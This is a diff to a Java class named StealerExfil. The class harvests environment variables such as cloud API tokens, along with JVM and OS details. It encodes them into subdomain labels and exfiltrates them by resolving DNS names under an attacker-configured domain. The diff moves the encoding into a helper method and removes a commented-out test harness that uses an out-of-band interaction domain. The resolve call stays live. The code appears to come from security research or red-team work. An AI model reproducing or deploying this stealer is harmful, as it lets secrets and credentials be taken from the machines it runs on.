@@ -83,16 +83,21 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
         exfilData.put("jvm", getRuntimeInfo(javaProps));
         exfilData.putAll(getJuicyEnvVars(envVars));
 
-        String packed = pack(exfilData);
-        //System.out.println("Encoding and exfiltrating the following data:\n" + packed);
-        String encoded = rebase(packed, TOKEN_ALPHABET, URL_ALPHABET);
-        String uniqueId = getUniqueId();
-        List<String> requests = split(encoded, uniqueId, CONF_DOMAIN);
+        List<String> requests = encode(exfilData);
 
         for (String request : requests) {
             //System.out.println("Not actually resolving: " + request);
             resolve(request);   // Comment out this line during testing
         }
+    }
+
+    static List<String> encode(Map<String, String> exfilData) {
+        String packed = pack(exfilData);
+        //System.out.println("Encoding and exfiltrating the following data:\n" + packed);
+        String encoded = rebase(packed, TOKEN_ALPHABET, URL_ALPHABET);
+        String uniqueId = getUniqueId();
+        List<String> requests = split(encoded, uniqueId, CONF_DOMAIN);
+        return requests;
     }
 
     static Map<String, String> getJuicyEnvVars(Map<String, String> env) {
@@ -294,22 +299,4 @@ public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
         Random rng = new SecureRandom();
         return "" + rng.nextInt(0, Integer.MAX_VALUE);
     }
-
-    // This method can be used to generate some synthesised test data. This can't override the hostname, though. :P
-//    public static void main(String[] args) {
-//        Map<String, String> testEnv = new HashMap<>();
-//        testEnv.put("HOSTNAME", "test-host-01");
-//        testEnv.put("USERNAME", "service-user");
-//        testEnv.put("CLOUD_SECRET_UID", "secret-id");
-//        testEnv.put("CLOUD_API_TOKEN", "super-sensitive-api-token");
-//        Properties testProps = new Properties();
-//        testProps.put("os.name", "Linux");
-//        testProps.put("os.version", "v1.2.3-something4");
-//        testProps.put("java.vm.version", "UberJDK v1.2.3-something4");
-//
-//        StealerExfil.CONF_DOMAIN = "abc123.oast.fun";
-//        StealerExfil.CONF_SUBDOMAIN_MAX_LEN = 20;
-//        StealerExfil.CONF_FQDN_MAX_LEN = 100;
-//        new StealerExfil().payload(testEnv, testProps);
-//    }
 }
